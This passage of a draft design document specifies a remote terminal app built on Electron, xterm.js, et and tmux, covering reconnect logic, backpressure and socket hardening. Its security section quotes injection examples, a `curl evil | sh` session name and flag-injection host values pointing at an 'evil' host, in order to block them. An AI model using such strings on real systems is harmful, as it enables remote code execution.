# Design Doc: Durable Remote Terminal (working name: TBD)

> A cmux-style terminal launcher where remote processes persist server-side and the
> local client auto-reconnects after connection drops or app restarts.

**Status:** Draft · **Date:** 2026-07-09

---

## 1. Motivation

`cmux` (manaflow-ai/cmux) does roughly what we want — a session-oriented terminal
that attaches to remote tmux — but we found it **not stable enough**. This project
rebuilds that workflow with a focus on:

- **Durability**: remote processes keep running regardless of local connection state.
- **Auto-reconnect**: the local client re-attaches to the remote session
  automatically after a network drop *and* after the app is closed and reopened.
- **A sidebar** listing sessions/projects for quick switching.
- **Stability** over feature breadth.

### Why not just use an existing terminal + tmux? (scope honesty)

The combo **`et host -c 'tmux new -A -s x'` in WezTerm/iTerm already delivers essentially
all of §1's durability, reconnect, and cross-restart persistence** — for free, with far
fewer moving parts. This must be stated plainly because the stated goal is **stability**,
yet this proposal adds Electron + React + xterm.js + node-pty + a respawn supervisor +
persistence + WebGL-context-loss handling — strictly *more* surface area than the baseline
it replaces. More parts is not obviously more stable.

**The one irreducible feature the baseline can't give us is the session-management
sidebar** (a persistent, clickable list of remote sessions with status, add/rename/remove,
restore-on-launch). That — and only that — is the justification for a custom app.

### Lower-surface alternatives that ALSO deliver a sidebar (evaluate before building)

Because the thesis is "stability = fewer parts," we must show the sidebar actually
*requires* this stack. Two materially cheaper designs deliver a session list:

1. **tmux control mode (`tmux -CC`)** — iTerm2's tmux integration is a shipping existence
   proof: a terminal driving `tmux -CC` gets a programmatic window/session list (native
   tabs mapped to tmux windows) with **none** of this app's supervisor/pty/render surface.
   A `tmux -CC` client over et could yield a sidebar at a fraction of the risk. Cost: we'd
   be building/using a control-mode client, and control mode's UX model differs from raw
   attach.
2. **TUI session picker** — `sesh`/`fzf` over `tmux ls`, launched in the baseline terminal,
   gives a keyboard-driven session list with ~zero custom app code. Loses the always-
   visible graphical sidebar, but meets most of the need.

**Decision gate (falsifiable, must resolve before Milestone 1):** *Spike a `tmux -CC`
control-mode client (over et) for ~1 day.* **If** it yields a clickable session list with
per-session status/rename/restore that meets the need → **this app is cancelled** in favor
of that plus a thin config. The full Electron app is justified **only if** that spike fails
to deliver a usable session panel — i.e. the sidebar demonstrably needs a persistent
graphical panel those approaches can't provide. Owner: the project author records the spike
outcome here before any Milestone-1 code. This is a binding build/don't-build test, not a
rationalization.

---

## 2. Core Architecture Principle

Three **different** durability layers, each covering a distinct failure. Getting the
attribution right matters — an earlier draft conflated them:

| Layer | Owner | Covers | Does NOT cover |
|---|---|---|---|
| **Cross-restart persistence** | **tmux on the remote** | Client process death, app close/reopen, laptop reboot. `tmux new -A -s <name>` = attach if exists, else create (the **app always adds `-D`** — §5.1 — to detach stale clients; the bare form here is just the generic durability concept). Processes keep running server-side. | Nothing about the network link. |
| **In-session drop resilience** | **`et` (Eternal Terminal)** | Transient TCP drops, sleep/wake, IP changes — et's BackedReader/BackedWriter buffers the last N bytes and resumes **without exiting**. | et's resume state lives **in the client process**; closing the app destroys it. et does **not** survive app restart. |
| **Hard-failure bridge** | **The app (respawn)** | et exiting for a *transient* reason after giving up. Bounded, backoff-gated — see §5.1. | Fatal causes (auth, missing binary, dead host, user detach) → must NOT respawn. |
| **Layout / UI** | **The app** | Sidebar, tabs, session list, reconnect/dead indicators. | — |
| **Rendering** | **xterm.js** (initially) | Drawing the terminal grid. Behind a transport-level seam — see §7. | — |

**Key correction:** "reopen the app and reconnect" is delivered by **tmux**, not et. et
covers only *in-session* drops while the client is alive. The app's respawn is a *bounded
bridge*, not the reconnect mechanism, and it is **not** redundant with et — they cover
different layers (see §5.1 for why naive respawn is dangerous).

Honest baseline: **`et host -c 'tmux new -A -s x'` in any existing terminal already
delivers durability + reconnect + cross-restart persistence.** The sole product delta of
this app is the **session-management sidebar/UI** (§1). We are not reinventing durability;
we are wrapping a UI around it.

---

## 3. Technology Decisions

> Defaults chosen; **marked items need confirmation**.

| Layer | Choice | Rationale |
|---|---|---|
| **Shell / windows** | **Electron** | One bundled Chromium → *far less rendering variance* than Tauri's 3 webviews (NOT pixel-identical — glyphs still route through per-OS rasterizers CoreText/DirectWrite/FreeType). Most mature terminal stack (VS Code, Hyper, Tabby). Trade binary size/RAM for consistency. **Rendering consistency ≠ feature parity:** the OOB channel needs a local tmux binary, so Windows has a materially degraded feature set (§9.0) — resolve platform scope in §9 Q5. |
| **Terminal view** | **xterm.js** (`@xterm/xterm`, current scoped pkg) + **`@xterm/addon-webgl`** + **`@xterm/addon-fit`** | Engine **and** renderer for web/Electron. **WebGL only for the focused/visible terminal** — Chromium caps live WebGL contexts (~8–16, LRU-evicted), so a per-session WebGL context would evict older panes' contexts and fire `webglcontextlost` on them. Background sessions use the **DOM renderer** (the canvas addon is no longer part of current xterm.js — WebGL and DOM are the only renderers) or dispose their WebGL addon on hide. See §8. |
| **PTY** | **node-pty** | Spawns the pty in the main process; battle-tested (VS Code uses it). |
| **Connection layer** | **`et` (Eternal Terminal)** ⚠️ *confirm* | Best auto-reconnect. Needs `etserver` + open port on remote. Alternatives: `mosh` (UDP, roams networks), `ssh`+`autossh` (no remote install, crudest). |
| **Frontend framework** | **React + TypeScript** ⚠️ *confirm* | Good ergonomics for sidebar/session list/tabs. Alt: plain TS (lighter). |
| **Scaffold tooling** | **electron-vite** ⚠️ *confirm* | Fast HMR, sensible main/preload/renderer split. Alts: Electron Forge, minimal hand-rolled. |

### Why Electron over Tauri (for now)

- Tauri uses the **OS webview** → xterm.js would run on **3 different engines**
  (WebKit/mac, WebView2/Windows, WebKitGTK/Linux). WebGL quality/perf varies, and
  **WebKitGTK on Linux is the weak link** (slower, packaging fiddly).
- Electron's single Chromium gives **consistent rendering** everywhere — the right
  call while validating the product.
- Cost accepted: larger binaries, higher RAM.

### Why xterm.js over alacritty_terminal / libghostty (for now)

- **xterm.js** = engine + renderer, purpose-built for web/Electron. Fastest path to a
  working product.
- **alacritty_terminal** = engine only (Rust); we'd have to write a renderer. Reserved
  for a *future* native/wgpu path if we outgrow xterm.js (§8).
- **libghostty** = engine + GPU rendering, but embedding is **macOS-first**, not
  cross-platform, and the C API is young. Rejected on cross-platform grounds.
- Note: xterm.js and alacritty_terminal are **both engines** — never used together;
  one replaces the other.

---

## 4. Process & Data Flow

```
Main process (Node)                     Renderer process (Chromium)
─────────────────────                   ────────────────────────────
node-pty: spawn                         xterm.js + WebGL(focused) + fit  (view)
  et …-c 'tmux -S … new -A -D…' -- host  React sidebar (session list, tabs)
respawn supervisor (backoff, §5.1)      resize → fitAddon.fit()
session persistence (disk)              status: connected/reconnecting/dead
input validation (§6)                            │            ▲
        │            ▲                            │            │
        └──── IPC (pty bytes both ways) ──────────┘            │
              + resize {cols,rows}, spawn, kill, ACK ──────────┘
              + session events
```

- **Data down (pty → view)**: `pty.onData` → IPC → `term.write(data)` (`string` in v1, §7).
- **Data up (view → pty)**: `term.onData` → IPC → `pty.write(data)`.
- **Resize**: `fitAddon.fit()` → `{cols, rows}` → IPC → `pty.resize(cols, rows)`.
  Must fire on window resize **and** on reattach — see §5.4 for the reattach ordering.
  (This is the #1 xterm.js bug source.)

### 4.1 Backpressure / flow control (v1 correctness requirement, not optional)

xterm.js `write()` is non-blocking and buffers; **past a ~50 MB internal buffer it
silently *discards* input** (per the xterm.js flow-control guide), and with a socket/IPC
in the path naive buffering "isn't reliable." A `cat hugefile` / `yes` / verbose build
over the remote pty will therefore **corrupt the display or wedge the terminal** on day
one unless we plumb backpressure end-to-end. This is *not* the §8 "throughput ceiling
later" concern — it is a correctness bug without a fix.

Mechanism (must exist in v1):
- Use `term.write(data, callback)` in the renderer; the callback ACKs bytes over IPC.
- **Watermark accounting lives in MAIN** (driven by renderer ACKs), because `pty.pause()`
  is a main-side call — main tracks unacked bytes and, over HIGH watermark, calls
  **`pty.pause()`**; resumes with **`pty.resume()`** below LOW. (`pause`/`resume` are real
  node-pty APIs.) Suggested watermarks per the xterm.js guide: HIGH ~100 KB (≤500 KB), LOW
  ~10 KB.
- **What this does NOT do — corrected overclaim:** pausing node-pty does **not** reliably
  backpressure the *remote* producer. node-pty's child is the **et client**; et uses
  independent reader/writer paths and its own BackedReader/BackedWriter buffer, so its
  reader keeps draining the socket into **client-side memory** even while its stdout write
  is blocked. So the effect is: the local pty pipe fills, but the **buffer relocates into
  et's client memory + TCP windows** — the remote `yes`/`cat` keeps producing. Treat et as
  an effectively **infinite-buffer datasink** (the same caveat the xterm.js guide gives for
  websockets).
- **What v1 actually guarantees:** the *xterm.js* buffer never overflows (no silent
  discard, no wedge). It does **not** bound et's client memory under a sustained remote
  firehose, and the app **cannot** bound et's internal BackedReader buffer via any API —
  `pty.pause()` doesn't reach it. Be honest about this rather than implying "monitor" fixes
  it:
  - **Backstop = userspace watchdog, NOT rlimit.** `RLIMIT_RSS` is a **no-op on modern
    Linux** (effective only on Linux 2.4.x <30) and **unenforced on macOS** (verified);
    cgroups are Linux-only; so "set an RSS rlimit on the et child" — an earlier draft's
    "only real lever" — **does nothing on all three target platforms.** Instead the
    supervisor **samples et-client RSS (§11) on a fixed interval and acts on a ceiling.**
  - **Avoid the kill→reattach→refill livelock.** A blind kill+reconnect re-attaches to the
    *same* tmux session where `yes` is still running → the flood resumes → RSS climbs → kill
    again, forever, and the user never regains control. So: (1) size the ceiling for the
    interval (`ceiling ≥ interval × max-drain-rate` + headroom) so a fast firehose can't OOM
    *between* samples; (2) on **repeated** trips within a window, do **not** blind-reconnect
    — transition to a distinct **`throttled`** state (stop reading the pty / require user
    ack) rather than looping. The trip counter MUST be a **wall-clock sliding window keyed
    by session id that persists across the kill→`reconnecting`→`connected` cycle** — a
    per-connection counter that resets on each `connected` would never reach "repeated"
    (every reconnect starts fresh) and the livelock recurs, just paced by the reconnect
    interval. Rule: **N trips within T seconds → `throttled`**, regardless of intervening
    reconnects. (3) **watchdog kills are NOT auth failures — exclude them from the lifetime
    auth-attempt cap (§5.1)**, or a merely-noisy healthy session gets driven to `dead` by a
    dead-host protection. tmux persisted the session, so no work is lost across a watchdog
    kill — this is kill-and-recover, not true backpressure.
  - **Optional per-OS hard cap** layered under the watchdog: Linux → cgroup v2
    `memory.max` (or `RLIMIT_AS`, noting it caps virtual address space and can over-count);
    Windows → **Job Object** `JOB_OBJECT_LIMIT_PROCESS_MEMORY`; macOS → no clean per-process
    RSS cap exists, so the userspace watchdog *is* the mechanism there.
  - If throttling remote *production* is ever needed, it must be done **remote-side** (a
    rate limit / reduced tmux buffering); `tmux history-limit` does **not** help here.
  - v1 accepts **unbounded-lag-but-no-corruption**, with the RSS watchdog as the OOM
    backstop. §11 tracks et-client RSS + IPC queue depth and **drives the kill lever**.

---

## 5. Key Features & How They Work

### 5.1 Durable sessions + bounded reconnect

**Correct launch command** (verified against `et` v7.0.0 — `et --help`): et has **no `--`
passthrough**. Remote commands run via **`-c`**, which *exits after the command returns*
(`-e/--noexit` keeps it open). The command is a **shell string on the remote**, so inputs
must be validated (§6):

```js
// host, session, port, user validated/decomposed in main process FIRST (§6)
// -D detaches other clients on attach → no size-fight (§5.1). NO -x/-y: they are
// IGNORED on the attach path (verified, tmux 3.6a); the pty winsize below is what sizes.
// -S pins a deterministic remote socket for the OOB channel (§5.2); set-option pins
// window-size latest so reattach tracks the client even under a largest/manual tmux.conf.
const dir = `/tmp/et-${remoteUser}`, sock = `${dir}/et-${id}.sock`   // per-user 0700 (§6.1)
// Create the socket dir first, EVERY time: tmux -S with a missing parent dir prints
// "error creating … (No such file or directory)" and STILL exits 0 (verified) → silent
// no-server. Use `mkdir -m 700` (NOT `mkdir -p … && chmod 700`): on a shared host a
// co-tenant can squat the predictable path, and `mkdir -p` on an existing dir returns 0
// WITHOUT reasserting mode/owner (verified) → the "0700 protection" is a no-op and chmod
// on a foreign-owned dir EPERMs. `mkdir -m 700 ${dir}` fails atomically (rc≠0) if the path
// already exists, so a squat is DETECTED (→ surface a distinct error, not silent `dead`),
// and we then verify it's a real dir (not a symlink) owned by us before binding.
pty.spawn('et', [...etArgs, '-t', `${sock}:${sock}`,
  '-c', `{ mkdir -m 700 ${dir} 2>/dev/null || [ -O ${dir} -a ! -L ${dir} ]; } && ` +
        `tmux -S ${sock} new-session -A -D -s ${session} \\; set-option window-size latest`,
  '--', host],   // <-- -c MUST precede --; host is the sole positional after --
  { cols, rows, ... })   // {cols,rows} (the pty winsize) is the real size source
```
(`-O` = owned by our euid, `! -L` = not a symlink; so we proceed only if we just created the
0700 dir, or it already exists as our own real dir — a foreign/symlinked squat fails closed
and is surfaced, not silently retried into `dead`. Alternatively place the socket under
`$XDG_RUNTIME_DIR`/`$TMUX_TMPDIR`, which is already a per-user 0700 dir.)
The **local** side must likewise `mkdir -p` its half of the forward dir before `et -t`
binds. **Never treat tmux's exit code as bind-success** (it returns 0 even when the socket
wasn't created) — confirm success by the OOB poll finding the socket / `list-clients` rows
(§5.2).

This is **the** canonical launch command; §2/§4/§5.2/§5.4/§10 refer to it.
**Argv order is load-bearing (verified):** `--` halts et's flag parsing and everything
after it is positional, so `-c <payload>` placed *after* `--` is **silently dropped** — et
opens a bare shell, no tmux session, no `-S` socket, OOB channel never connects. Therefore
`-c '<payload>'` comes **before** `--`, and `<host>` is the **sole** token after `--` (which
still gives the §6.1 leading-`-` host defense).

> **Sizing — corrected mechanism.** An earlier draft claimed `-x/-y` "bake in" the size.
> **Verified false:** `-x/-y` are honored *only* on detached create (`new -d`); on attach
> (and attached-create) tmux **ignores them and adopts the client/pty winsize**. Correct
> sizing therefore comes from spawning the et pty at the fitted `{cols, rows}`, combined
> with tmux's default **`window-size latest`** (window tracks the most-recent client) so
> reattach re-sizes. Two consequences: (1) the pty MUST be spawned at the fitted size
> (§5.4); (2) if a user/corp `tmux.conf` sets `window-size largest|manual`, reattach won't
> track — so **pin it inside the `-c` payload** (`tmux new-session -A -D -s <s> \; set-option
> window-size latest`; note `tmux new -o`/`attach -o` are **invalid** — `unknown flag -o`,
> verified) and keep an explicit post-attach `pty.resize()` as insurance.

**Layer roles (see §2):** et handles *transient in-session drops without exiting*; tmux
persists the session server-side across client/app death. The app's `onExit` respawn is a
**bounded bridge for hard et exits only**.

**Exit codes do NOT carry a usable transient-vs-fatal signal — verified.** Running
`et -c 'tmux new -A -s x' <host>` against both an unreachable host and a refusing host
returns **exit `1` with the byte-identical message `Could not reach the ET server:
<host>:2022`**, and that diagnostic is written to **stdout** — i.e. into the same pty byte
stream as terminal content, with no clean side channel. So an earlier draft's "classify
transient vs fatal by exit code, respawn only transient" is **not implementable**. Revised
supervisor:

- **Clean exit (code 0) = intentional → never respawn.** `et -c '…'` (no `-e`) **exits
  when the tmux client returns** — which happens on an *in-terminal* `Ctrl-b d` detach the
  user types inside xterm.js, not just on an app-UI close. An `intentionalClose` flag set
  only by app actions **cannot see** an in-terminal detach, so respawning on exit-0 would
  yank the user back into a session they deliberately left — regressing below the raw
  `et+tmux` baseline. **Rule: exit code 0 ⇒ user left on purpose ⇒ no respawn** (gray out /
  offer reconnect). Only *non-zero* exits are candidates for respawn. Verified locally: a
  clean tmux `detach-client` yields client exit **0** while the session survives, and
  unreachable/refused hosts yield exit **1** — so 0-vs-nonzero is a real signal. **Residual
  risk** (Milestone 0, needs a live `etserver`): whether `et -c` *propagates* tmux's exit 0
  vs. always returning 0. If it does not propagate, the fallback becomes the **primary**
  plan — run et with `-e/--noexit` and drive detach/close through explicit app actions.
  Emit an **observable event** whenever "exit-0 ⇒ no respawn" fires (§11), so a
  mis-propagated exit-0 that silently fails to reconnect a wanted session is visible.
  **Gate the rule on "no respawn in flight for this session id":** if client B reconnects
  with `-D` and detaches a still-live client A, A exits 0 — which must NOT be read as user
  intent. Only treat exit 0 as intentional when the supervisor didn't itself just trigger a
  detaching reconnect.
- **Also honor `intentionalClose`** for app-initiated close/kill: it suppresses respawn
  **and cancels any pending backoff timer** — a queued respawn must not fire after dismiss.
- **No fine-grained transient/fatal classification** (exit codes carry no usable signal, as
  verified above). Every *non-zero* exit → retry with capped exponential backoff
  (1s, 2s, 4s … max 30s), then state **`dead`** + "click to retry".
- **Bound total auth attempts, not just CPU (ssh-lockout risk).** et bootstraps over ssh,
  so each respawn is a fresh ssh auth attempt. A host with an expired key / wrong principal
  / bastion MFA behind PAM `faillock` can be **locked out** by an unbounded retry burst —
  unacceptable for a "stability" app. So: cap **lifetime** attempts per session (not just
  per-burst), and enforce a **long floor** (e.g. ≥30s) between user-initiated "retry"
  clicks. Bounding CPU is not bounding auth.
- **Prevent double-attach with `-D`, not by "awaiting exit."** Killing the *local* et
  process does **not** immediately drop the *remote* tmux client — it lingers until the
  remote notices the dead connection (keepalive/TCP timeout). A respawn can attach a
  *second* client while the first lingers; tmux then sizes to the **smallest** client (the
  size-fight). Fix deterministically with **`tmux new-session -A -D -s <session>`** — `-D`
  detaches other clients on attach (verified, tmux 3.6a man page). This also covers the
  **cross-restart** orphan case (app crash → orphan et client → relaunch re-attaches).
- **Reap the local orphan precisely — never pattern-kill.** `-D` handles the *remote*
  lingering client; a crashed app can also leave a local `et` child (reparented to init, no
  live handle). Do **not** `pkill et` — that would kill the user's unrelated et sessions
  (the same collateral-damage class as `-x`). Instead **persist each child's PID + a
  start-time/argv fingerprint** alongside the session file; on startup, reap only exact
  fingerprint matches before re-attaching.
- **Cause visibility** (for the sidebar's dead-state reason): run et with `-l <logdir>` /
  `--logtostdout -v N` and read et's **structured log on a side channel** — never scrape
  the pty stdout stream (et's own "Could not reach…" diagnostic is written there,
  intermixed with terminal output; verified).

### 5.2 Restore on app reopen (restores *connections*, not *state*)

- Persist `[{ id, host, session, title, order, lastActive }]` to disk at
  `app.getPath('userData')`. **Treat this file as untrusted input on load** — re-validate
  `host`/`session` (§6) before use.
- On launch, **lazy-connect**: spawn only the last-active session eagerly; connect others
  on first focus. (Spawning all at once = N simultaneous ssh/et handshakes, and any dead
  host trips the §5.1 backoff loop N-fold — a thundering herd on startup.)
- **What actually survives:** tmux (server-side) survives app restart; et's in-client
  resume buffer does **not**. So restore = re-run et → re-attach the still-living tmux
  session. **If the remote rebooted, the tmux server is gone and `new -A -D` silently
  creates a fresh empty session** → silent data-loss illusion.
  - **Keep the single atomic launch command** `tmux new-session -A -D -s <s>` (§5.1) — do
    **not** switch to a `has-session && attach || new` compound: that is (a) **broken** —
    `tmux attach -D` is an invalid flag (`-D` is `new-session`-only; verified: `command
    attach-session: unknown flag -D`), so on a *live* session it would fail to attach and
    fire a false "lost" alarm on every reconnect; (b) a **TOCTOU race** (two clients both
    see "no session" and both create); and (c) its create branch drops `-D`, reintroducing
    the size-fight §5.1 fixed.
  - **A real out-of-band control channel is required — and a single blocking `et -c
    'tmux …'` pty does NOT provide one.** That invocation yields exactly one pty byte
    stream; there is no second channel to run a `tmux display-message` query on, and the
    banner-vs-tmux ambiguity (§5.4) means the byte stream itself can't be parsed for control
    state (which §5.2 forbids anyway). **This is the control-plane transport the design
    must name** (it also gates the `connecting→connected` transition, §5.3):
    - **Chosen mechanism: forward the remote tmux server socket over the same et
      connection** (et's `-t` supports unix-socket forwards; verified in `et --help`).
      *Expected* — and to be **confirmed in Milestone 0 against a live host** — that a local
      `tmux -S` client's one-shot *control queries* (`display-message`, `list-clients`)
      survive a plain byte forward (they don't use fd/credential passing, unlike attach). The
      whole OOB channel rides on this, so it is an explicit M0 gate, not an assumed fact.
    - **App-control the remote socket path — do NOT rely on tmux's default.** The default
      `/tmp/tmux-<remote-uid>/default` depends on the **remote uid** (which the app doesn't
      know — it knows the *username*, not uid) and on remote `$TMUX_TMPDIR`, so a guessed
      path forwards to nothing → session hangs in `connecting`. Instead **pin a deterministic
      remote socket in the `-c` payload** (see the canonical command, §5.1) and forward that
      exact path. **Namespace under a per-user dir created with `mkdir -m 700`** —
      `/tmp/et-<user>/et-<id>.sock`, not bare `/tmp/et-<id>.sock` (`<id>` per-session avoids
      multi-session/cross-host collision). **Threat model, stated honestly:** this closes
      *hijack* (a co-tenant can't get the app to bind/adopt an attacker-owned or symlinked
      dir — the `mkdir -m 700` + `-O`/`! -L` check fails closed, §5.1). It does **not** fully
      close *squatting*: a co-tenant who pre-creates `/tmp/et-<user>` can cause the victim's
      `mkdir -m 700` to fail every time → a persistent **DoS** (session surfaces a distinct
      "socket dir squatted" error rather than silently going `dead`). Fully eliminating the
      DoS requires an unpredictable path (`/tmp/et-<user>-<rand>/`) or `$XDG_RUNTIME_DIR`.
    - **The remote `-S` socket doesn't exist until the `-c` payload's `tmux new-session`
      runs** (a few hundred ms after connect), so the OOB probe must **poll/retry** until it
      appears. **Poll on query *output* rows, not exit code, for attach-detection:** a
      missing-socket query deterministically returns rc 1 (`error connecting …`) and an
      attached-but-no-clients query returns rc 0 + empty — so treat *both* "error connecting"
      and "zero client rows" as not-yet-attached, and poll until real `list-clients -t
      <session>` rows appear or the §5.3 timeout fires. (rc alone can't distinguish
      "connected, nobody attached yet" from "attached," which is the distinction we need.)
    - **Every OOB query MUST target `-t <session>`.** On the shared remote tmux server a
      target-less `display-message`/`list-clients` returns an **arbitrary** session
      (verified: it returned a *different* session's `session_created`), causing false
      `lost` alarms and wrong connect-detection. Use
      `tmux -S <sock> display-message -p -t <session> '#{session_created}'` and
      `list-clients -t <session>` (the `<session>` charset is validated, §6.1). This runs
      **out-of-band on the one connection** — no second ssh auth, no in-band bytes — and
      drives both "attached yet?" (§5.3) and lost-session detection.
    - **tmux protocol-version lockstep is a prerequisite (§9.0).** The OOB queries run the
      **local** tmux binary as a client against the **remote** tmux server socket, and tmux
      enforces strict protocol-version match (`protocol version mismatch`). If the local and
      remote tmux protocol versions differ, the queries fail — connect-confirmation falls
      back to the §5.3 timeout and **lost-detection silently stops working — which reopens
      exactly the silent-fresh-session data-loss illusion this channel was added to prevent**
      (rebooted remote → `new -A -D` makes a fresh empty session, undetected). So **treat
      matching local/remote tmux as a hard setup requirement (§9.0), not a soft note**, or
      run the queries with the *remote* binary via `-CC` control mode (the §1 spike
      alternative), where client and server are the same binary.
    - **Clean up the stale local forward socket on startup** (§5.1 reap pass): `unlink` the
      per-session forward socket before re-binding, else `et -t` fails with "address already
      in use" after a crash.
    - **Alternative: tmux control mode (`-CC`)** — gives structured attach/exit/session
      events natively out-of-band. This is the same capability §1's decision-gate spike
      evaluates; if that spike wins, this whole channel problem dissolves.
  - **Lost-session detection: persist the REMOTE `#{session_created}` at first successful
    attach; on reattach, flag `lost` iff the queried value differs.** Verified:
    `session_created` persists across `new -A -D` (same epoch) and changes across a
    kill-server/reboot. Do **not** compare against local app-start time — it's a *remote*
    clock, so skew/NTP steps would cause false alarms. First run has no baseline (nothing to
    lose yet).
  - **Never** derive app control state from the terminal byte stream (no in-band sentinel).
- **Scrollback expectation:** reattach redraws only the *current screen*; historical
  scrollback lives in tmux copy-mode (reachable via tmux keys), **not** replayed into
  xterm.js. Set a generous tmux `history-limit`; do not promise scrollback restore.
- App-owned state we *do* restore: tab order, focus, titles. Per-session working dir /
  running program is owned by tmux, not us.

### 5.3 Sidebar

- Left panel listing sessions/projects.
- Click → focus that terminal.
- Add/remove/rename sessions.

**Per-session state machine** (drives the status indicator):

| State | Enter when | Leaves to |
|---|---|---|
| `idle` | Persisted but not yet connected (lazy, §5.2) | `connecting` on focus/spawn |
| `connecting` | pty spawned, awaiting tmux attach | `connected` when the **OOB channel** (§5.2, forwarded tmux socket / `-CC`) confirms a client is attached — **not** "first pty data" (that's the et banner, §5.4); `reconnecting` on non-zero exit; `dead` if attempts exhausted. **OOB-confirm timeout:** if the OOB channel doesn't confirm within a bound but the pty is alive, optimistically go `connected` (demote OOB to lost-detection only) so a broken forward can't hang the session forever. |
| `connected` | OOB channel confirms attach (or timeout, above) | `closed` on exit 0 (intentional, §5.1); `reconnecting` on non-zero exit; `throttled` on repeated watchdog trips (§4.1) |
| `throttled` | Repeated RSS-watchdog trips (§4.1) — pty reads paused | `connected` on user ack/resume; `closed` on user close |
| `reconnecting` | Non-zero exit, backoff timer pending | `connected` on success; `dead` at lifetime-attempt cap; `closed` if user closes mid-backoff (cancels timer) |
| `dead` | Retry cap reached | `connecting` on user "retry" (subject to ≥30s floor, §5.1) |
| `closed` | Clean exit 0 / user close | `connecting` on user reconnect |
| `lost` (flag) | Reattach found a freshly-created session (§5.2) | overlays `connected`; cleared on ack |

### 5.4 Resize correctness & reattach ordering

- `@xterm/addon-fit` computes cols/rows from the container.
- Send to pty on: window resize, sidebar toggle, tab switch, and **reattach**.
- **Reattach ordering contract** (avoids garbled/clipped redraw): the real size source is
  the **et pty winsize** (spawn the pty at the fitted `{cols, rows}`) plus tmux's default
  **`window-size latest`** so the window tracks the newest client — **not** `-x/-y`, which
  are inert on attach (§5.1). So: **fit the container → spawn the pty at that size**; do not
  rely on the launch command's flags to size the window.
- Do **not** key a corrective resize off "first `onData`": the first bytes from a fresh et
  are typically the ssh/et connection banner or et's stdout diagnostics (§5.1), **not**
  tmux's redraw, so resizing then can fire before tmux attaches. If a post-attach corrective
  resize is needed (window changed size during connect, or `window-size` isn't `latest`),
  key it off a short settle debounce after attach and an explicit `pty.resize()`.

---

## 6. Security

### 6.1 Remote command injection (the real risk — must fix before any session CRUD ships)

Two distinct injection surfaces, closed differently. node-pty `spawn` passes an **argv
array (no local shell)**, so classic *local* shell injection is not the issue — but two
real vectors remain:

**(a) Remote shell injection via `session` (the `-c` payload) AND tmux argv-flag injection
via `session`.** `-c` is a shell string executed on the *remote*, and `session` is also
passed into **tmux argv** (`new-session -s <s>`). Two hazards: shell metacharacters
(`x; curl evil | sh`, `$(...)`) → remote code execution; and a **leading `-`** (e.g. `-X`,
`-D`) → tmux parses it as a *flag*, not a name (verified: `tmux new -s -X` creates a session
literally named `-X` only by getopt accident; fragile and order-dependent). **Closed by
charset validation:** `session` must match **`^[A-Za-z0-9][A-Za-z0-9_-]*$`** — first char
**alphanumeric** (rejects leading `-`), and `.` **excluded** (collides with tmux target
syntax `session:window.pane`). After this, the token has no shell metacharacters and can't
be a flag.

**(b) argv flag-injection via `host`/`user`/`port`.** `host` is passed as et's
**positional argv**, and et parses options from argv, so a `host` beginning with `-` becomes
a flag: `-x` silently kills the user's other et sessions; `--jumphost=…`, `-t 9999:evil:22`,
`-c 'cmd'` all reachable. Mitigations:
- **Decompose, don't pass a raw positional (lead with this).** Parse `user@host:port` into
  sub-fields in main and pass **`-u <user> -p <port>`** as separate validated options; this
  sidesteps most of the grammar problem. Never forward a raw user-controlled field as a
  positional.
- **Pass the host after a `--` end-of-flags marker** as free defense-in-depth: et **does**
  honor `--` (verified: `et -c 'echo hi' -- -x` treats `-x` as the host), so a residual
  leading-`-` host can't be parsed as a flag. **Ordering caveat (verified):** `--` halts et
  flag parsing entirely, so **all et options — including `-c <payload>` and `-t` — MUST come
  before `--`, and `<host>` is the only token after it.** Putting `-c` after `--` silently
  drops the payload (§5.1).
- **Grammar per sub-field, with explicit leading-`-` reject:**
  - `user`: `^[A-Za-z0-9][A-Za-z0-9._-]*$`
  - `port`: numeric **1–65535** (regex `[0-9]{1,5}` is not enough — reject `0`, `99999`).
  - `host`: `^[A-Za-z0-9][A-Za-z0-9.-]*$` for hostnames/IPv4, **plus an explicit IPv6
    branch** — et supports IPv6 (`et --help`), but a naive grammar with a single `:` port
    separator **rejects all IPv6** (`::1`, `2001:db8::1`). Accept bare/bracketed IPv6 forms,
    but **always strip to the bare address and route the port to `-p`** — never pass a
    bracketed-with-port token: verified that `et '[::1]:2022'` mis-parses as
    `[::1]:2022:2022` (et appends its own default port). et also requires `-p` for
    `::`-abbreviated addresses. Reject a leading `-` in every sub-field.

**Both surfaces, common rules:**
- **The renderer never passes raw argv or command strings.** The contextBridge exposes only
  `{host, session}` (+ opaque session `id`); the **main process** parses/validates/builds
  all argv.
- **Re-validate the persisted JSON on load** (§5.2) — treat it as untrusted input.

### 6.2 SSH / auth handling (previously unspecified — a gap)

- et bootstraps over ssh. We rely on the user's existing ssh config / agent; **the app
  stores no credentials and no private keys.**
- **`-f/--forward-ssh-agent` is opt-in only, never default.** Agent forwarding exposes the
  local agent socket to the remote host; a compromised/hostile remote can use it to
  authenticate as the user elsewhere. Off by default; per-host toggle with a warning.
- Do not write host/session secrets to logs. Redact `-c` payloads if command logging is added.

### 6.3 Electron hardening

- `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`.
- **Preload** exposes a narrow `window.terminalAPI` via `contextBridge`:
  `write(id, data)`, `onData(id, cb)`, `resize(id, cols, rows)`, `ackWrite(id)` (§4.1),
  and session CRUD keyed by `{host, session}` — **no free-form `spawn(argv)`**.
- node-pty stays in **main**, reached only over IPC.
- **IPC ordering & authorization:** use **one channel per session id** so pty bytes,
  `write`, and `resize` for a session are ordered w.r.t. each other (cross-session ordering
  is not needed). Single-user local app, so any renderer code may drive any session id
  today; **before multi-window (§9 Q7)**, add a per-window capability check so a window can
  only address sessions it owns.

---

## 7. The Swappable Seam — cut at the transport level, not the TS interface

**Correcting an earlier overclaim:** a TypeScript `TerminalView` interface does **not**
make the §8 native-renderer swap "contained." That interface lives in the Chromium
renderer; a Rust + wgpu + `alacritty_terminal` renderer draws to a **native GPU
surface/window**, not a DOM `<canvas>` a JS class can implement. Realizing §8 means a
native child window composited into/over the Electron window (or leaving Electron
entirely) — the web layout no longer owns the terminal rectangle, so a TS `TerminalView`
would be **discarded, not reused**. Selling it as a contained swap is wishful.

**The seam that actually survives a renderer change is the transport contract**, because
it is renderer-agnostic by construction:

> **Per session, over IPC:** pty output down; input up; `{cols, rows}` resize; write-ACK
> for backpressure (§4.1); lifecycle events (spawn/exit/state). This contract is identical
> whether the far end is an xterm.js `<div>` or a native surface. (Payload type: `string`
> in v1 — see the node-pty note below; a `Uint8Array` variant is the post-fork target.)

The sidebar / session list / respawn supervisor / persistence depend **only on this
